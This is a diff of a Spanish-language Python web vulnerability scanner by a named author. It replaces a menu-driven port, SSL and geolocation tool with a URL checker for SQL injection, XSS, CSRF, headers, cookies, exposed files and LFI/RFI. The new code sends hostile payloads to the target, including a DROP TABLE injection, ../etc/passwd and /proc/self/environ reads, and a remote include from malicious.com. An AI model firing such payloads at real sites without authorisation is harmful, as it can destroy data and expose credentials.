@@ -1,354 +1,283 @@
-import os
-import time
-import socket
 import requests
+import re
 import logging
-import ssl
-from lxml import etree
-from urllib.parse import urlparse
-from lxml import html
 from bs4 import BeautifulSoup
-from colorama import Fore, Style, init
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime
-from typing import Tuple
+import time
+import sys
 
-init()
+# Configurar el logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-ASCII_ART = """
- ██████████                                                                                     █████    
-░░███░░░░░█                                                                                    ░░███     
- ░███  █ ░   █████   ██████   ██████   ████████    ██████   ██████     █████ ███ █████  ██████  ░███████ 
- ░██████    ███░░   ███░░███ ░░░░░███ ░░███░░███  ███░░███ ███░░███   ░░███ ░███░░███  ███░░███ ░███░░███
- ░███░░█   ░░█████ ░███ ░░░   ███████  ░███ ░███ ░███████ ░███ ░███    ░███ ░███ ░███ ░███████  ░███ ░███
- ░███ ░   █ ░░░░███░███  ███ ███░░███  ░███ ░███ ░███░░░  ░███ ░███    ░░███████████  ░███░░░   ░███ ░███
- ██████████ ██████ ░░██████ ░░████████ ████ █████░░██████ ░░██████      ░░████░████   ░░██████  ████████ 
-░░░░░░░░░░ ░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░   ░░░░░░        ░░░░ ░░░░     ░░░░░░  ░░░░░░░░  
-
-        Autor: Julian Andres (Codespectre)
-        Contacto: julianandresvallestero@proton.me
-        Script de análisis de seguridad web para escaneo de puertos, vulnerabilidades,
-        archivos ocultos, métodos HTTP, y certificados SSL/TLS.
-"""
-
-print(ASCII_ART)
-
-# Función para limpiar la pantalla
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+# Colores para la salida en consola
+class Color:
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+    RESET = '\033[0m'
 
 # Función para mostrar la barra de carga
-def show_loading_bar():
-    print(Fore.GREEN + "Cargando", end="")
-    for _ in range(5):
-        print(".", end="", flush=True)
-        time.sleep(0.5)
-    print(" Hecho!" + Style.RESET_ALL)
+def barra_carga(duration, message="Cargando"):
+    total_length = 50
+    for i in range(total_length + 1):
+        bar = '#' * i + '-' * (total_length - i)
+        sys.stdout.write(f'\r{message} [{bar}] {i * 2}% completado')
+        sys.stdout.flush()
+        time.sleep(duration / total_length)
+    print()
 
-# Función para guardar los resultados en un archivo
-def save_to_file(filename, content):
-    try:
-        with open(filename, 'w') as file:
-            file.write(content)
-        print(Fore.GREEN + f"Resultados guardados en {filename}" + Style.RESET_ALL)
-    except IOError as e:
-        print(Fore.RED + f"Error al guardar en el archivo: {e}" + Style.RESET_ALL)
+# Función para validar URL
+def es_url_valida(url):
+    regex = re.compile(
+        r'^(?:http|ftp)s?://'  # Esquema
+        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # Dominio
+        r'localhost|'  # localhost
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # IPv4
+        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # IPv6
+        r'(?::\d+)?'  # Puerto
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
 
-# Función para escanear puertos
-def scan_ports(ip):
-    open_ports = []
-    ports = [20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 3389, 8080]
+    return re.match(regex, url) is not None
 
-    def scan_port(port):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.settimeout(1)
-            try:
-                if sock.connect_ex((ip, port)) == 0:
-                    return port
-            except socket.error as e:
-                logging.error(f"Error al escanear el puerto {port}: {e}")
-            return None
-
-    try:
-        with ThreadPoolExecutor(max_workers=100) as executor:
-            future_to_port = {executor.submit(scan_port, port): port for port in ports}
-            for future in as_completed(future_to_port):
-                port = future.result()
-                if port is not None:
-                    open_ports.append(port)
-
-        result = f"Resultados del escaneo de puertos en {ip}:\n\n"
-        result += "Puertos abiertos: " + ', '.join(map(str, open_ports)) + "\n"
-        if not open_ports:
-            result += "No se encontraron puertos abiertos.\n"
-
-        save_to_file('scan_ports_results.txt', result)
-    except Exception as e:
-        logging.error(f"Error durante el escaneo de puertos: {e}")
-
-# Función para verificar vulnerabilidades CSRF
-def verificar_csrf(formulario):
-    """
-    Verifica la presencia de un token CSRF en el formulario.
-
-    :param formulario: Objeto de formulario en formato XML/HTML.
-    :return: Mensaje indicando la presencia o ausencia de una vulnerabilidad CSRF.
-    """
-    try:
-        # Verificar que 'formulario' es un objeto lxml y tiene el método xpath
-        if not isinstance(formulario, etree._Element):
-            raise TypeError("El objeto proporcionado no es un elemento de lxml.")
-
-        # Buscar el token CSRF
-        csrf_tokens = formulario.xpath('//input[@name="csrf_token"]')
-        
-        # Verificar si se encontró al menos un token CSRF
-        if not csrf_tokens:
-            logging.warning("Posible vulnerabilidad CSRF en el formulario.")
-            return "Posible vulnerabilidad CSRF en el formulario.\n"
-        
-        return "No se detectó vulnerabilidad CSRF en el formulario.\n"
-    except TypeError as te:
-        logging.error(f"Error de tipo al verificar CSRF: {te}")
-        return f"Error de tipo al verificar CSRF: {te}\n"
-    except etree.XMLSyntaxError as xml_e:
-        logging.error(f"Error de sintaxis XML al verificar CSRF: {xml_e}")
-        return f"Error de sintaxis XML al verificar CSRF: {xml_e}\n"
-    except Exception as e:
-        logging.error(f"Error inesperado al verificar CSRF: {e}")
-        return f"Error inesperado al verificar CSRF: {e}\n"
-
-# Función para verificar inyección SQL
+# Función para verificar vulnerabilidades de inyección SQL
 def verificar_inyeccion_sql(url):
-    """
-    Verifica la presencia de posibles vulnerabilidades de inyección SQL en el contenido de una URL.
-
-    :param url: La URL del recurso a verificar.
-    :return: Mensaje indicando la presencia de vulnerabilidades de inyección SQL.
-    """
-    palabras_clave_sql = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'UNION']
-    try:
-        # Hacer la solicitud HTTP
-        response = requests.get(url)
-        response.raise_for_status()  # Lanza una excepción para códigos de estado HTTP 4xx/5xx
-
-        # Buscar palabras clave en el contenido de la respuesta
-        issues = []
-        content = response.text.upper()  # Convertir el contenido a mayúsculas para una búsqueda insensible a mayúsculas/minúsculas
-        for palabra_clave in palabras_clave_sql:
-            if palabra_clave in content:
-                issues.append(f"Posible vulnerabilidad de inyección SQL detectada: {palabra_clave}")
-
-        if not issues:
-            return "No se detectaron vulnerabilidades de inyección SQL.\n"
-
-        return "\n".join(issues) + "\n"
+    logging.info(f"{Color.YELLOW}[-] Verificando inyección SQL...{Color.RESET}")
+    barra_carga(3, "Verificando inyección SQL")
     
-    except requests.RequestException as e:
-        logging.error(f"Error al realizar la solicitud HTTP: {e}")
-        return f"Error al realizar la solicitud HTTP: {e}\n"
-    except Exception as e:
-        logging.error(f"Error inesperado al verificar inyección SQL: {e}")
-        return f"Error inesperado al verificar inyección SQL: {e}\n"
+    payloads = ["' OR '1'='1' --", "'; DROP TABLE users; --", '" OR "1"="1" --']
+    issues = []
 
-# Función para verificar XSS
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+
+        for payload in payloads:
+            test_url = f"{url}?id={payload}"
+            test_response = requests.get(test_url)
+
+            if test_response.status_code in [500, 403]:
+                issues.append(f"Posible vulnerabilidad detectada con el payload '{payload}' (Código HTTP: {test_response.status_code}).")
+                issues.append(f"Respuesta del servidor: {test_response.text[:200]}")  # Muestra los primeros 200 caracteres
+            elif len(test_response.text) != len(response.text):
+                issues.append(f"Posible inyección SQL con el payload '{payload}' debido a cambios en el contenido.")
+                issues.append(f"Respuesta del servidor: {test_response.text[:200]}")  # Muestra los primeros 200 caracteres
+
+        return "\n".join(issues) if issues else "No se detectaron vulnerabilidades de inyección SQL."
+
+    except requests.RequestException as e:
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
+
+# Función para verificar vulnerabilidades XSS
 def verificar_xss(url):
-    """
-    Verifica la presencia de posibles vulnerabilidades de Cross-Site Scripting (XSS) en una URL.
-
-    :param url: La URL del recurso a verificar.
-    :return: Mensaje indicando la presencia o ausencia de vulnerabilidades XSS.
-    """
-    try:
-        # Hacer la solicitud HTTP
-        response = requests.get(url)
-        response.raise_for_status()  # Lanza una excepción para códigos de estado HTTP 4xx/5xx
-
-        # Parsear el contenido HTML
-        root = html.fromstring(response.content)
-
-        # Buscar etiquetas <script> y atributos peligrosos
-        scripts = root.xpath('//script')
-        inline_event_handlers = root.xpath('//@*[contains(., "javascript:") or contains(., "data:")]')
-
-        issues = []
-        if scripts:
-            issues.append("Posible vulnerabilidad de Cross-Site Scripting (XSS) detectada: etiquetas <script> encontradas.")
-        if inline_event_handlers:
-            issues.append("Posible vulnerabilidad de Cross-Site Scripting (XSS) detectada: atributos con potencial de inyección de JavaScript encontrados.")
-
-        if not issues:
-            return "No se detectaron vulnerabilidades de XSS.\n"
-
-        return "\n".join(issues) + "\n"
+    logging.info(f"{Color.YELLOW}[-] Verificando XSS...{Color.RESET}")
+    barra_carga(3, "Verificando XSS")
     
-    except requests.RequestException as e:
-        logging.error(f"Error al realizar la solicitud HTTP: {e}")
-        return f"Error al realizar la solicitud HTTP: {e}\n"
-    except Exception as e:
-        logging.error(f"Error inesperado al verificar XSS: {e}")
-        return f"Error inesperado al verificar XSS: {e}\n"
+    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
+    issues = []
 
-# Función para obtener HTML de una URL
-def get_html(url):
-    """
-    Obtiene el HTML de una URL.
-
-    :param url: La URL del recurso a obtener.
-    :return: El contenido HTML de la URL.
-    """
     try:
         response = requests.get(url)
         response.raise_for_status()
-        return response.text
+
+        for payload in payloads:
+            test_url = f"{url}?search={payload}"  # Cambia el parámetro según lo necesario
+            test_response = requests.get(test_url)
+
+            if payload in test_response.text:
+                issues.append(f"Vulnerabilidad XSS detectada con el payload '{payload}'.")
+
+        return "\n".join(issues) if issues else "No se detectaron vulnerabilidades XSS."
+
     except requests.RequestException as e:
-        logging.error(f"Error al obtener el HTML: {e}")
-        return None
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
 
-# Función para analizar un dominio
-def analyze_domains(url):
-    """
-    Realiza un análisis de seguridad de un dominio específico.
-
-    :param url: La URL del dominio a analizar.
-    """
-    logging.info(f"Analizando dominio: {url}")
-
-    # Obtener HTML
-    html_content = get_html(url)
-    if html_content is None:
-        return
-
-    # Analizar vulnerabilidades CSRF
+# Función para verificar protección CSRF en formularios
+def verificar_csrf(url):
+    logging.info(f"{Color.YELLOW}[-] Verificando CSRF...{Color.RESET}")
+    barra_carga(3, "Verificando CSRF")
+    
+    issues = []
     try:
-        soup = BeautifulSoup(html_content, 'html.parser')
+        response = requests.get(url)
+        response.raise_for_status()
+
+        soup = BeautifulSoup(response.content, 'html.parser')
         forms = soup.find_all('form')
-        csrf_results = ""
+
         for form in forms:
-            form_html = str(form)
-            formulario = etree.HTML(form_html)
-            csrf_results += verificar_csrf(formulario)
-        save_to_file('csrf_results.txt', csrf_results)
-    except Exception as e:
-        logging.error(f"Error al analizar formularios para CSRF: {e}")
+            csrf_token = form.find('input', attrs={'name': re.compile(r'csrf|token', re.I)})
+            if not csrf_token:
+                issues.append("Posible vulnerabilidad CSRF: No se encontró un token en el formulario.")
 
-    # Analizar inyección SQL
-    sql_injection_results = verificar_inyeccion_sql(url)
-    save_to_file('sql_injection_results.txt', sql_injection_results)
+        return "\n".join(issues) if issues else "No se encontraron vulnerabilidades CSRF."
 
-    # Analizar XSS
-    xss_results = verificar_xss(url)
-    save_to_file('xss_results.txt', xss_results)
-
-# Función para obtener detalles de certificados SSL
-def get_ssl_certificate_info(hostname):
-    """
-    Obtiene la información del certificado SSL/TLS de un host.
-
-    :param hostname: Nombre del host para obtener el certificado.
-    :return: Información del certificado SSL/TLS.
-    """
-    port = 443
-    context = ssl.create_default_context()
-    try:
-        with socket.create_connection((hostname, port)) as sock:
-            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
-                cert = ssock.getpeercert()
-        return cert
-    except Exception as e:
-        logging.error(f"Error al obtener la información del certificado SSL: {e}")
-        return None
-
-# Función para verificar la validez del certificado SSL
-def check_ssl_certificate(hostname: str) -> Tuple[str, str, str]:
-    port = 443
-    context = ssl.create_default_context()
-
-    with socket.create_connection((hostname, port)) as sock:
-        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
-            cert = ssock.getpeercert()
-
-    # Parse certificate validity dates
-    valid_from = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
-    valid_until = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
-    now = datetime.now()
-
-    # Check if the certificate is valid
-    if now < valid_from or now > valid_until:
-        return "El certificado SSL no es válido."
-    
-    # Extract issuer and subject information
-    issuer = dict(x[0] for x in cert['issuer'])
-    subject = dict(x[0] for x in cert['subject'])
-    
-    return (f"Certificado SSL válido.\n"
-            f"Válido desde: {valid_from}\n"
-            f"Válido hasta: {valid_until}\n"
-            f"Emisor: {issuer}\n"
-            f"Sujeto: {subject}")
-
-# Función para geolocalizar una IP
-def geolocalizar_ip(ip):
- 
-    try:
-        response = requests.get(f'http://ip-api.com/json/{ip}')
-        response.raise_for_status()
-        data = response.json()
-        if data['status'] == 'fail':
-            return f"No se pudo obtener la geolocalización para la IP: {data['message']}\n"
-        return (
-            f"Geolocalización para {ip}:\n"
-            f"País: {data['country']}\n"
-            f"Región: {data['regionName']}\n"
-            f"Ciudad: {data['city']}\n"
-            f"Código Postal: {data['zip']}\n"
-            f"Latitud: {data['lat']}\n"
-            f"Longitud: {data['lon']}\n"
-            f"ISP: {data['isp']}\n"
-        )
     except requests.RequestException as e:
-        logging.error(f"Error al realizar la solicitud de geolocalización: {e}")
-        return f"Error al realizar la solicitud de geolocalización: {e}\n"
-    except Exception as e:
-        logging.error(f"Error inesperado al obtener la geolocalización: {e}")
-        return f"Error inesperado al obtener la geolocalización: {e}\n"
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
 
-# Función principal del menú
-def main_menu():
-    while True:
-        clear_screen()
-        print(ASCII_ART)
-        print(Fore.YELLOW + "Menú Principal" + Style.RESET_ALL)
-        print("1. Escanear puertos")
-        print("2. Analizar dominio")
-        print("3. Verificar certificado SSL")
-        print("4. Geolocalizar IP")
-        print("5. Salir")
+# Función para verificar encabezados de seguridad
+def verificar_encabezados(url):
+    logging.info(f"{Color.YELLOW}[-] Verificando encabezados de seguridad...{Color.RESET}")
+    barra_carga(3, "Verificando encabezados de seguridad")
+    
+    issues = []
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
 
-        choice = input(Fore.CYAN + "Seleccione una opción: " + Style.RESET_ALL)
-        if choice == '1':
-            ip = input("Ingrese la dirección IP para escanear: ")
-            scan_ports(ip)
-        elif choice == '2':
-            url = input("Ingrese la URL del dominio a analizar: ")
-            analyze_domains(url)
-        elif choice == '3':
-            hostname = input("Ingrese el nombre del host para verificar el certificado SSL: ")
-            cert_info = check_ssl_certificate(hostname)
-            print(cert_info)
-            save_to_file('ssl_certificate_info.txt', cert_info)
-        elif choice == '4':
-            ip = input("Ingrese la dirección IP para geolocalizar: ")
-            geo_info = geolocalizar_ip(ip)
-            print(geo_info)
-            save_to_file('geolocalizacion_ip.txt', geo_info)
-        elif choice == '5':
-            print(Fore.GREEN + "Saliendo..." + Style.RESET_ALL)
-            break
-        else:
-            print(Fore.RED + "Opción no válida. Intente nuevamente." + Style.RESET_ALL)
-        input(Fore.YELLOW + "Presione Enter para continuar..." + Style.RESET_ALL)
+        security_headers = {
+            'X-Content-Type-Options': 'nosniff',
+            'X-Frame-Options': 'DENY',
+            'X-XSS-Protection': '1; mode=block',
+            'Content-Security-Policy': ''
+        }
 
+        for header, value in security_headers.items():
+            if header not in response.headers:
+                issues.append(f"Encabezado de seguridad faltante: {header}")
+            elif value and response.headers[header] != value:
+                issues.append(f"Encabezado de seguridad incorrecto: {header} debe ser '{value}'.")
+
+        return "\n".join(issues) if issues else "Todos los encabezados de seguridad recomendados están presentes."
+
+    except requests.RequestException as e:
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
+
+# Función para verificar cookies
+def verificar_cookies(url):
+    logging.info(f"{Color.YELLOW}[-] Verificando cookies...{Color.RESET}")
+    barra_carga(3, "Verificando cookies")
+    
+    issues = []
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+
+        cookies = response.cookies
+        for cookie in cookies:
+            if not cookie.secure:
+                issues.append(f"Cookie insegura encontrada: {cookie.name} (debe tener el atributo 'Secure').")
+            if not cookie.has_nonstandard_attr('HttpOnly'):
+                issues.append(f"Cookie sin HttpOnly encontrada: {cookie.name} (debe tener el atributo 'HttpOnly').")
+
+        return "\n".join(issues) if issues else "Todas las cookies están correctamente configuradas."
+
+    except requests.RequestException as e:
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
+
+# Función para detectar rutas de archivos expuestos
+def detectar_archivos_expuestos(url):
+    logging.info(f"{Color.YELLOW}[-] Detectando archivos expuestos...{Color.RESET}")
+    barra_carga(3, "Detectando archivos expuestos")
+    
+    common_paths = [
+        '/.env', '/config.php', '/db_backup.sql', '/backup.zip', '/test.php'
+    ]
+    issues = []
+
+    try:
+        for path in common_paths:
+            test_url = f"{url}{path}"
+            response = requests.get(test_url)
+
+            if response.status_code == 200:
+                issues.append(f"Ruta expuesta encontrada: {test_url}")
+
+        return "\n".join(issues) if issues else "No se encontraron rutas de archivos expuestos."
+
+    except requests.RequestException as e:
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
+
+# Función para verificar errores de depuración
+def verificar_errores_de_depuracion(url):
+    logging.info(f"{Color.YELLOW}[-] Verificando errores de depuración...{Color.RESET}")
+    barra_carga(3, "Verificando errores de depuración")
+    
+    issues = []
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+
+        if re.search(r'\b(debug|error|exception|traceback)\b', response.text, re.IGNORECASE):
+            issues.append("Posible error de depuración detectado en la respuesta.")
+
+        return "\n".join(issues) if issues else "No se encontraron errores de depuración en la respuesta."
+
+    except requests.RequestException as e:
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
+
+# Función para verificar LFI/RFI
+def verificar_lfi_rfi(url):
+    logging.info(f"{Color.YELLOW}[-] Verificando LFI/RFI...{Color.RESET}")
+    barra_carga(3, "Verificando LFI/RFI")
+    
+    payloads = [
+        "../etc/passwd", "../proc/self/environ", "http://malicious.com/malware.txt"
+    ]
+    issues = []
+
+    try:
+        for payload in payloads:
+            test_url = f"{url}?file={payload}"
+            response = requests.get(test_url)
+
+            if response.status_code == 200 and "passwd" in response.text:
+                issues.append("Vulnerabilidad LFI detectada.")
+            elif response.status_code == 200 and "malware" in response.text:
+                issues.append("Vulnerabilidad RFI detectada.")
+
+        return "\n".join(issues) if issues else "No se detectaron vulnerabilidades LFI/RFI."
+
+    except requests.RequestException as e:
+        logging.error(f"Error al realizar la solicitud: {e}")
+        return f"Error: {e}"
+
+# Función principal de análisis
+def analizar_pagina(url):
+    logging.info(f"{Color.GREEN}[-] Analizando la página: {url}{Color.RESET}")
+
+    # Validar la URL
+    if not es_url_valida(url):
+        logging.error("URL no válida.")
+        return "URL no válida."
+
+    # Verificar vulnerabilidades
+    reportes = {
+        "Inyección SQL": verificar_inyeccion_sql(url),
+        "XSS": verificar_xss(url),
+        "CSRF": verificar_csrf(url),
+        "Encabezados de Seguridad": verificar_encabezados(url),
+        "Cookies": verificar_cookies(url),
+        "Archivos Expuestos": detectar_archivos_expuestos(url),
+        "Errores de Depuración": verificar_errores_de_depuracion(url),
+        "LFI/RFI": verificar_lfi_rfi(url)
+    }
+
+    # Generar el informe
+    informe = "\n".join([f"{categoria}:\n{resultado}" for categoria, resultado in reportes.items()])
+
+    # Guardar el informe en un archivo
+    with open("informe_vulnerabilidades.txt", "w") as f:
+        f.write(informe)
+
+    logging.info(f"{Color.GREEN}[-] Análisis completado. Informe guardado como 'informe_vulnerabilidades.txt'.{Color.RESET}")
+    return informe
+
+# Ejecución del script
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-    main_menu()
+    if len(sys.argv) != 2:
+        logging.error("Uso: python vuln_checker.py <URL>")
+        sys.exit(1)
+
+    url = sys.argv[1]
+    resultado = analizar_pagina(url)
+    print(resultado)
